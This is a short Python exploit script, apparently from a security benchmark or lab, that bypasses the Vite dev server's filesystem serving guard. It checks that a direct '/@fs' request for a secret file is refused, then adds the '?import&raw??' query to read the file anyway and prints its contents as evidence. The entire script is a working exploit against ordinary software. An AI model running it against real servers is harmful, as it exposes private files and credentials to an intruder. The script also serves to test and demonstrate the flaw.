#!/usr/bin/env python3
"""Read a private file by bypassing Vite's filesystem serving guard."""

import json
import os
import urllib.error
import urllib.request


FLAG_PATH = "/tmp/vite002-secret"
REQUEST_PATH = "/@fs/tmp/vite002-secret"


def request_file(url: str) -> tuple[int, str]:
    try:
        response = urllib.request.urlopen(url, timeout=30)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        return response.status, response.read().decode("utf-8")


def decode_raw_module(body: str) -> str:
    prefix = "export default "
    if not body.startswith(prefix):
        raise RuntimeError("Vite did not return a raw import module")
    content, _ = json.JSONDecoder().raw_decode(body[len(prefix):])
    if not isinstance(content, str):
        raise RuntimeError("Vite raw import did not contain a string")
    return content


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    file_url = f"{target_url.rstrip('/')}{REQUEST_PATH}"
    direct_status, _ = request_file(file_url)
    if direct_status != 403:
        raise RuntimeError(f"direct private file request returned HTTP {direct_status}")

    bypass_status, body = request_file(f"{file_url}?import&raw??")
    if bypass_status != 200:
        raise RuntimeError(f"bypass request returned HTTP {bypass_status}")

    print(json.dumps({
        "evidence_payload": {
            "flag_path": FLAG_PATH,
            "content": decode_raw_module(body),
        },
        "direct_status": direct_status,
        "bypass_status": bypass_status,
    }))


if __name__ == "__main__":
    main()
